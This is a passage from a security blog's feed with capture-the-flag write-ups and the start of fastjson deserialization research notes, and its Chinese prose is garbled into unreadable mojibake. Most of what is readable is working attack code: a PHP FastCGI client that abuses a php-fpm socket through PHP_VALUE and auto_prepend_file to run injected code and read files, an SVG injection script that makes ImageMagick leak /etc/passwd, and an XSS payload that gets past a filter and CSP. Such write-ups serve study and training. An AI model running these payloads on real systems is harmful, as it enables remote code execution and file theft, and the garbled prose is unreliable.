128) &#123;</span></span><br><span class="line"><span class="string">                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);</span></span><br><span class="line"><span class="string">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);</span></span><br><span class="line"><span class="string">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);</span></span><br><span class="line"><span class="string">                $vlen |= (ord($data&#123;$p++&#125;));</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span></span><br><span class="line"><span class="string">            $p += ($nlen + $vlen);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return $array;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $data String containing all the packet</span></span><br><span class="line"><span class="string">     * @return array</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function decodePacketHeader($data)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $ret = array();</span></span><br><span class="line"><span class="string">        $ret['version']       = ord($data&#123;0&#125;);</span></span><br><span class="line"><span class="string">        $ret['type']          = ord($data&#123;1&#125;);</span></span><br><span class="line"><span class="string">        $ret['requestId']     = (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;);</span></span><br><span class="line"><span class="string">        $ret['contentLength'] = (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;);</span></span><br><span class="line"><span class="string">        $ret['paddingLength'] = ord($data&#123;6&#125;);</span></span><br><span class="line"><span class="string">        $ret['reserved']      = ord($data&#123;7&#125;);</span></span><br><span class="line"><span class="string">        return $ret;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @return array</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function readPacket()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123;</span></span><br><span class="line"><span class="string">            $resp = $this-&gt;decodePacketHeader($packet);</span></span><br><span class="line"><span class="string">            $resp['content'] = '';</span></span><br><span class="line"><span class="string">            if ($resp['contentLength']) &#123;</span></span><br><span class="line"><span class="string">                $len  = $resp['contentLength'];</span></span><br><span class="line"><span class="string">                while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) &#123;</span></span><br><span class="line"><span class="string">                    $len -= strlen($buf);</span></span><br><span class="line"><span class="string">                    $resp['content'] .= $buf;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            if ($resp['paddingLength']) &#123;</span></span><br><span class="line"><span class="string">                $buf=fread($this-&gt;_sock, $resp['paddingLength']);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return $resp;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="string">     * @return array</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function getValues(array $requestedInfo)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $this-&gt;connect();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $request = '';</span></span><br><span class="line"><span class="string">        foreach ($requestedInfo as $info) &#123;</span></span><br><span class="line"><span class="string">            $request .= $this-&gt;buildNvpair($info, '');</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="string">        if ($resp['type'] == self::GET_VALUES_RESULT) &#123;</span></span><br><span class="line"><span class="string">            return $this-&gt;readNvpair($resp['content'], $resp['length']);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public function request(array $params, $stdin)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $response = '';</span></span><br><span class="line"><span class="string">        $this-&gt;connect();</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $paramsRequest = '';</span></span><br><span class="line"><span class="string">        foreach ($params as $key =&gt; $value) &#123;</span></span><br><span class="line"><span class="string">            $paramsRequest .= $this-&gt;buildNvpair($key, $value);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if ($paramsRequest) &#123;</span></span><br><span class="line"><span class="string">            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        $request .= $this-&gt;buildPacket(self::PARAMS, '');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if ($stdin) &#123;</span></span><br><span class="line"><span class="string">            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        $request .= $this-&gt;buildPacket(self::STDIN, '');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        do &#123;</span></span><br><span class="line"><span class="string">            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="string">            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span></span><br><span class="line"><span class="string">                $response .= $resp['content'];</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="string">            throw new Exception('Bad request');</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">        switch (ord($resp['content'][4])) &#123;</span></span><br><span class="line"><span class="string">            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="string">                throw new Exception('This app cant multiplex [CANT_MPX_CONN]');</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">            case self::OVERLOADED:</span></span><br><span class="line"><span class="string">                throw new Exception('New request rejected; too busy [OVERLOADED]');</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="string">                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="string">                return $response;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$client = new AA("unix:///var/run/php-fpm.sock");</span></span><br><span class="line"><span class="string">$req = '/var/www/html/index.php';</span></span><br><span class="line"><span class="string">$uri = $req .'?'.'command=ls';</span></span><br><span class="line"><span class="string">var_dump($client);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$code = "&lt;?php var_dump(scandir('/'));echo base64_encode(file_get_contents('/flag.h'));\\n?&gt;";</span></span><br><span class="line"><span class="string">$php_value = "allow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = php://input";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$params = array(       </span></span><br><span class="line"><span class="string">        'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',</span></span><br><span class="line"><span class="string">        'REQUEST_METHOD'    =&gt; 'POST',</span></span><br><span class="line"><span class="string">        'SCRIPT_FILENAME'   =&gt; '/var/www/html/index.php',</span></span><br><span class="line"><span class="string">        'SCRIPT_NAME'       =&gt; '/var/www/html/index.php',</span></span><br><span class="line"><span class="string">        'QUERY_STRING'      =&gt; 'command=ls',</span></span><br><span class="line"><span class="string">        'REQUEST_URI'       =&gt; $uri,</span></span><br><span class="line"><span class="string">        'DOCUMENT_URI'      =&gt; $req,</span></span><br><span class="line"><span class="string">        #'DOCUMENT_ROOT'     =&gt; '/',</span></span><br><span class="line"><span class="string">        'PHP_VALUE'         =&gt; $php_value,</span></span><br><span class="line"><span class="string">        'SERVER_SOFTWARE'   =&gt; 'asd',</span></span><br><span class="line"><span class="string">        'REMOTE_ADDR'       =&gt; '127.0.0.1',</span></span><br><span class="line"><span class="string">        'REMOTE_PORT'       =&gt; '9985',</span></span><br><span class="line"><span class="string">        'SERVER_ADDR'       =&gt; '127.0.0.1',</span></span><br><span class="line"><span class="string">        'SERVER_PORT'       =&gt; '80',</span></span><br><span class="line"><span class="string">        'SERVER_NAME'       =&gt; 'localhost',</span></span><br><span class="line"><span class="string">        'SERVER_PROTOCOL'   =&gt; 'HTTP/1.1',</span></span><br><span class="line"><span class="string">        'CONTENT_LENGTH'    =&gt; strlen($code)</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo "Call: $uri\\n\\n";</span></span><br><span class="line"><span class="string">var_dump($client-&gt;request($params, $code));</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">ret = execute_php_code(code)</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥å‘ç°æ ¹ç›®å½•çš„ <code>flag.so</code> å’Œ <code>flag.h</code>, è¯»å–å strings ä¸€ä¸‹å°±èƒ½è¯»åˆ° flag. ä¸è¿‡å¯ä»¥çœ‹åˆ°æ˜¯ä¸ ffi æœ‰å…³çš„, æ‰€ä»¥è¿™åšæ³•åº”è¯¥æ˜¯éé¢„æœŸäº†, ä¸è¿‡ä¹‹ååˆä¸Šäº†ä¸ª noeasyphp ä¿®äº†å‡ ä¸ªéé¢„æœŸè§£.<br>æœ€åè¯•äº†ä¸‹ç”¨ ffi æ‹¿ flag,  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ffi = FFI::load(<span class="string">"/flag.h"</span>);</span><br><span class="line">var_dump($ffi);</span><br><span class="line">var_dump($ffi-&gt;flag_fUn3t1on_fFi());</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯èƒ½è¯»åˆ° flag çš„, ä¸è¿‡è¿™æ–¹æ³•åå’Œæ–‡ä»¶åæ˜¯æ€ä¹ˆé¢„æœŸå¾—åˆ°å‘¢, çŒœæµ‹å¯èƒ½éœ€è¦ç”¨ ffi çš„åŠŸèƒ½å»ç›´æ¥è¶Šç•Œè¯»å†…å­˜? æ„Ÿè§‰é¢„æœŸè§£æ›´æœ‰æ„æ€ä¸€ç‚¹.  </p><h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>å¤§æ¦‚åŠŸèƒ½å¦‚ä¸‹: </p><ol><li>å‰ç«¯æäº¤å¯¹è¯åˆ°åç«¯, åç«¯è¿”å›ç”Ÿæˆçš„ svg å’Œå¯¹åº”çš„ id åˆ°å‰ç«¯é¢„è§ˆ</li><li>å‰ç«¯æäº¤ id åˆ°åç«¯, æ¸²æŸ“ svg åˆ°å›¾ç‰‡</li></ol><p>é—®é¢˜å‡ºåœ¨ç”Ÿæˆ, æœ‰ä¸ªåŠŸèƒ½æ˜¯æ’å…¥è¡¨æƒ…, æ¯”å¦‚ <code>[cool]</code>, ä¼šè¢«æ›¿æ¢ä¸º  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">x</span>=<span class="string">"1240"</span> <span class="attr">y</span>=<span class="string">"-60"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">xlink:href</span>=<span class="string">"http://pwnable.org:5000/static/emoji/cool"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶å¯èƒ½å­˜åœ¨æ³¨å…¥, æˆ‘ä»¬è¾“å…¥ <code>[cool&quot;&gt;&lt;a&gt;&lt;/a&gt;&lt;a href=&quot;]</code>, å°±æˆåŠŸæ³¨å…¥äº† <code>&lt;a&gt;&lt;/a&gt;</code> åˆ° svg é‡Œé¢. è¿™é‡Œå¯ä»¥æƒ³åˆ°ä¹‹å‰ç©ºæŒ‡é’ˆçš„ä¸€é“é¢˜, imagemagick åœ¨å¯¹ <code>text:/</code> åè®®è§£ææ—¶, ä¼šç›´æ¥è¯»å–æ–‡ä»¶é‡Œçš„å†…å®¹, äºæ˜¯æˆ‘ä»¬å°±èƒ½é€šè¿‡è¿™ä¸ªæ–¹å¼, æ³¨å…¥ä¸€ä¸ªå›¾ç‰‡, é“¾æ¥åˆ° <code>text:/etc/passwd</code>, ä¹‹åå°±èƒ½é€šè¿‡åç«¯æ¸²æŸ“å¾—åˆ°çš„å›¾ç‰‡, å¾—åˆ°æ–‡ä»¶å†…å®¹.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"></span><br><span class="line">d = <span class="string">'''</span></span><br><span class="line"><span class="string">[&#123;"type":0,"message":"Love you!&lt;a&gt;asd&lt;/a&gt;[cool\\"/&gt;&lt;image xlink:href=\\"text:/etc/passwd\\" x='-400px' y='400px' height='1500px' width='1500px'/&gt;&lt;a href=\\"]"&#125;,&#123;"type":1,"message":"Me too!!!"&#125;]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">res = sess.post(<span class="string">'http://pwnable.org:5000/preview'</span>, data=&#123;<span class="string">'data'</span>: d&#125;)</span><br><span class="line">svg = base64.b64decode(res.json()[<span class="string">'data'</span>][len(<span class="string">'data:image/svg+xml;base64,'</span>):])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.svg'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(svg)</span><br><span class="line"></span><br><span class="line">pid = res.json()[<span class="string">'previewid'</span>]</span><br><span class="line">res = sess.post(<span class="string">'http://pwnable.org:5000/share'</span>, data=&#123;<span class="string">'previewid'</span>: pid&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„, æ³¨å…¥çš„å†…å®¹å‰é¢ä¸€å®šè¦è·Ÿç‚¹ä¸œè¥¿, ä¸èƒ½ç›´æ¥è¿™æ · <code>[&quot;&gt;&lt;a&gt;&lt;/a&gt;&lt;a href=&quot;]</code>, å› ä¸º <code>http://pwnable.org:5000/static/emoji/</code>, è¿”å›çš„æ˜¯ 404, è€Œ <code>http://pwnable.org:5000/static/emoji/éšæ„çš„å†…å®¹</code> è¿”å›çš„æ˜¯å¾®ç¬‘. å¦‚æœä»€ä¹ˆéƒ½æ²¡æœ‰, imagemagick å¾—åˆ° 404 çš„è¯, è§£æä¼šç›´æ¥ä¸­æ­¢.  </p><p>ç°åœ¨å°±èƒ½è¯»å–æ–‡ä»¶äº†, ç»“åˆåç«¯æ˜¯ python, ç„¶åä¸€é¡¿æµ‹è¯•, å¾—åˆ°åº”ç”¨åœ¨ <code>/app/app.py</code>, å¯æƒœè¿™é‡Œå› ä¸º imagemagick çš„é—®é¢˜, èƒ½è¯»çš„æºç æœ‰é™, è°ƒå¤§å›¾ç‰‡å°ºå¯¸ä¹Ÿåªèƒ½å¾—åˆ°æ”¾å¤§çš„æ–‡å­—, ä¸èƒ½æ˜¾ç¤ºæ›´å¤šçš„æ–‡å­—.  </p><p>éƒ¨åˆ†æºç :  </p><p><img src="https://i.loli.net/2020/06/29/Gde8ry9uX3TKjR7.png" alt="">  </p><p>è®¿é—® <code>http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws</code>, ç„¶åé¢˜ç›®ä¸€è½¬ xssâ€¦ è¦æ±‚ alert(1).<br>å› ä¸ºè¿™é‡Œæœ‰ csp é™åˆ¶, æ²¡æ³•ç›´æ¥åœ¨ svg é‡Œé¢ç”¨ script alert, å¯¼è‡´è¿™é‡Œå¡äº†æŒºä¹…, ç„¶åå‘ç° imagemagick ç”Ÿæˆçš„æ–‡ä»¶æ‹“å±•åæ˜¯å¯æ§çš„, ä¹Ÿå°±æ˜¯ç¬¬äºŒæ­¥, å¾—åˆ°å›¾ç‰‡çš„è·¯å¾„æ˜¯ <code>http://pwnable.org:5000/image/gzVIsH/png</code>, ä¿®æ”¹æœ€åçš„ png åˆ° svg, å°±ä¼šå¦‚èœœä¼ å¦‚èœœ, ç›´æ¥è¾“å‡ºä¸€å¼ çš„ svg, è€Œä¸” content-type ä¹Ÿä¼šæ”¹å˜. ä¸è¿‡è¿™é‡Œåç«¯é™åˆ¶äº†æ‰©å±•åé•¿åº¦åªèƒ½ä¸º 3, å¦åˆ™ä¼šç›´æ¥æŠ¥é”™.<br>è¿™é‡ŒæŸ¥çœ‹æ–‡æ¡£, å‘ç° imagemagick æ˜¯æ”¯æŒè¾“å‡º htm çš„, <code>http://pwnable.org:5000/image/gzVIsH/htm</code> å¾—åˆ°çš„å°±æ˜¯ htm, content-type ä¹Ÿå˜æˆäº† <code>text/html</code>. äºæ˜¯ xss æ€è·¯å°±æ¥äº†, çœ‹åˆ°æºç çš„è¿‡æ»¤æ˜¯ç›´æ¥æ›¿æ¢ä¸ºç©º, å¯ä»¥ç”¨å–œé—»ä¹è§çš„åŒå†™ç»•è¿‡.<br>ç„¶ååœ¨ svg é‡Œé¢æŠŠæœ€å¤–é¢çš„ svg tag ç»™é—­åˆäº†, æ’å…¥ä¸€ä¸ª html tag, å†ç”¨ meta æ ‡ç­¾è·³åˆ°æˆ‘ä»¬çš„ç«™ä¸Š alert(1) å³å¯, è¿™æ ·å°±ç»•è¿‡äº† csp.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="string">'''</span></span><br><span class="line"><span class="string">[&#123;"type":0,"message":"Love you!&lt;a&gt;asd&lt;/a&gt;[cool\\"/&gt;&lt;/g&gt;&lt;/svg&gt;&lt;html&gt;&lt;metmetaa http-equiv='refresh' content=\\"0;URL='http://site.com/'\\" /&gt;&lt;/html&gt;&lt;a href=\\"]"&#125;,&#123;"type":1,"message":"Me too!!!"&#125;]</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>ä¸è¿‡æ„Ÿè§‰å¯èƒ½ä¹Ÿæ˜¯éé¢„æœŸ? å› ä¸ºçœ‹æºç è¿˜æœ‰ä¸ªå¯æ§ callback name çš„ jsonp æ²¡ç”¨ä¸Š.  </p><p>PS. è¿™é‡Œå…¶å®å¯ä»¥ç›´æ¥è¯» /proc/self/environ æ¥è¯»ç¯å¢ƒå˜é‡, å¯æƒœ imagemagick ç¢°åˆ° \x00 å°±åœæ­¢è¯»å–äº†, å¯¼è‡´åªèƒ½è¯»å–ç¬¬ä¸€ä¸ªç¯å¢ƒå˜é‡ PATH, éƒ½ä¸åˆ°åé¢çš„ flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åˆæ˜¯ä¸€å¹´ 0CTF, è¿™æ¬¡ä¸€ä¸ªäººä¸€é˜Ÿå•åˆ·ä¸€æ¬¡, åšå‡ºäº†ä¸¤é¢˜ WEB, å¯æƒœåªè¾“å‡ºäº†ä¸€å¤©, ç¬¬äºŒå¤©è¿˜è¦èµ¶ ddl, è¿˜æ˜¯å¤ªè”¡äº† orz&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="writeup" scheme="https://rmb122.com/tags/writeup/"/>
    
      <category term="0ctf" scheme="https://rmb122.com/tags/0ctf/"/>
    
  </entry>
  
  <entry>
    <title>fastjson 1.2.68 ååºåˆ—åŒ–æ¼æ´ gadgets æŒ–æ˜ç¬”è®°</title>
    <link href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/"/>
    <id>https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/</id>
    <published>2020-06-12T14:15:32.000Z</published>
    <updated>2020-08-10T13:46:51.505Z</updated>
    
    <content type="html"><![CDATA[<p>ä»¥æ­¤ç¥­å¥ æ‰¾ gadgets é€å»çš„é’æ˜¥, orz</p><a id="more"></a><h2 id="æ¼æ´åŸå› "><a href="#æ¼æ´åŸå› " class="headerlink" title="æ¼æ´åŸå› "></a>æ¼æ´åŸå› </h2><p>æ—¢ç„¶å·²ç»å‡ºäº†è¡¥ä¸, é¦–å…ˆ diff ä¸€ä¸‹æ–°ç‰ˆæœ¬ä¸æ—§ç‰ˆæœ¬çš„å·®åˆ«, è¿™é‡Œå› ä¸º fastjson ä¼šæ›´æ–°æ—§ç‰ˆæœ¬, è‡ªç„¶ä¼˜å…ˆå» diff æ—§ç‰ˆæœ¬çš„ sec æ›´æ–°. è€Œä¸æ˜¯å»çœ‹ git log, è¿™æ ·å¯ä»¥èŠ‚çœç‚¹æ—¶é—´, å› ä¸º sec æ›´æ–°åªåŒ…å«æ¼æ´ä¿®è¡¥, æ²¡æœ‰ feature çš„æ›´æ–°.  </p><p>è¿™é‡ŒæŒ‘äº† 1.2.48 ç‰ˆæœ¬:<br><a href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec09/" target="_blank" rel="noopener">https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec09/</a><br><a href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec10/" target="_blank" rel="noopener">https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec10/</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ diff 1.2.48-sec09/com/alibaba/fastjson/parser/ParserConfig.java  1.2.48-sec10/com/alibaba/fastjson/parser/ParserConfig.java</span><br><span class="line">71a72</span><br><span class="line">&gt;     public static final String    SAFE_MODE_PROPERTY        = "fastjson.parser.safeMode";</span><br><span class="line">75a77</span><br><span class="line">&gt;     public static  final boolean  SAFE_MODE;</span><br><span class="line">87a90,93</span><br><span class="line">&gt;             String property = IOUtils.getStringProperty(SAFE_MODE_PROPERTY);</span><br><span class="line">&gt;             SAFE_MODE = "true".equals(property);</span><br><span class="line">&gt;         &#125;</span><br><span class="line">&gt;         &#123;</span><br><span class="line">185a192</span><br><span class="line">&gt;     private boolean                                         safeMode               = SAFE_MODE;</span><br><span class="line">214a222,224</span><br><span class="line">&gt;                 0xD54B91CC77B239EDL,</span><br><span class="line">&gt;                 0xD59EE91F0B09EA01L,</span><br><span class="line">&gt;                 0xD8CA3D595E982BACL,</span><br><span class="line">244a255</span><br><span class="line">&gt;                 0x1CD6F11C6A358BB7L,</span><br><span class="line">273a285</span><br><span class="line">&gt;                 0x535E552D6F9700C1L,</span><br><span class="line">291c303,305</span><br><span class="line">&lt;                 0x7AA7EE3627A19CF3L</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;                 0x7AA7EE3627A19CF3L,</span><br><span class="line">&gt;                 0x7ED9311D28BF1A65L,</span><br><span class="line">&gt;                 0x7ED9481D28BF417AL</span><br><span class="line">497a512,519</span><br><span class="line">&gt;     public boolean isSafeMode() &#123;</span><br><span class="line">&gt;         return safeMode;</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;     public void setSafeMode(boolean safeMode) &#123;</span><br><span class="line">&gt;         this.safeMode = safeMode;</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt; </span><br><span class="line">1033a1056,1059</span><br><span class="line">&gt;         if (this.safeMode) &#123;</span><br><span class="line">&gt;             throw new JSONException("safeMode not support autoType : " + typeName);</span><br><span class="line">&gt;         &#125;</span><br><span class="line">&gt; </span><br><span class="line">1038,1045c1064,1075</span><br><span class="line">&lt;             if (expectClass == Object.class</span><br><span class="line">&lt;                     || expectClass == Serializable.class</span><br><span class="line">&lt;                     || expectClass == Cloneable.class</span><br><span class="line">&lt;                     || expectClass == Closeable.class</span><br><span class="line">&lt;                     || expectClass == EventListener.class</span><br><span class="line">&lt;                     || expectClass == Iterable.class</span><br><span class="line">&lt;                     || expectClass == Collection.class</span><br><span class="line">&lt;                     ) &#123;</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;             long expectHash = TypeUtils.fnv1a_64(expectClass.getName());</span><br><span class="line">&gt;             if (expectHash == 0x90a25f5baa21529eL</span><br><span class="line">&gt;                     || expectHash == 0x2d10a5801b9d6136L</span><br><span class="line">&gt;                     || expectHash == 0xaf586a571e302c6bL</span><br><span class="line">&gt;                     || expectHash == 0xed007300a7b227c6L</span><br><span class="line">&gt;                     || expectHash == 0x295c4605fd1eaa95L</span><br><span class="line">&gt;                     || expectHash == 0x47ef269aadc650b4L</span><br><span class="line">&gt;                     || expectHash == 0x6439c4dff712ae8bL</span><br><span class="line">&gt;                     || expectHash == 0xe3dd9875a2dc5283L</span><br><span class="line">&gt;                     || expectHash == 0xe2a8ddba03e69e0dL</span><br><span class="line">&gt;                     || expectHash == 0xd734ceb4c3e9d1daL</span><br><span class="line">&gt;             ) &#123;</span><br></pre></td></tr></table></figure><p>æ˜æ˜¾çœ‹åˆ° expectClass çš„åˆ¤æ–­å‡ºäº†å˜åŒ–, ç”šè‡³åŠ äº†å±‚ hash, æœ‰ç§æ­¤åœ°æ— é“¶ä¸‰ç™¾ä¸¤çš„å‘³é“ 233.<br>è¿™é‡Œä¿®æ”¹ä¸‹ fastjson-blacklist, æ”¹æˆç”¨ <code>TypeUtils.fnv1a_64</code> æ¥è®¡ç®— hash, å¯ä»¥å¾—åˆ°æ–°å¢äº†ä¸‰ä¸ªç±»å‹çš„åˆ¤æ–­, <code>java.lang.AutoCloseable</code>, <code>java.lang.Readable</code>, <code>java.lang.Runnable</code>.  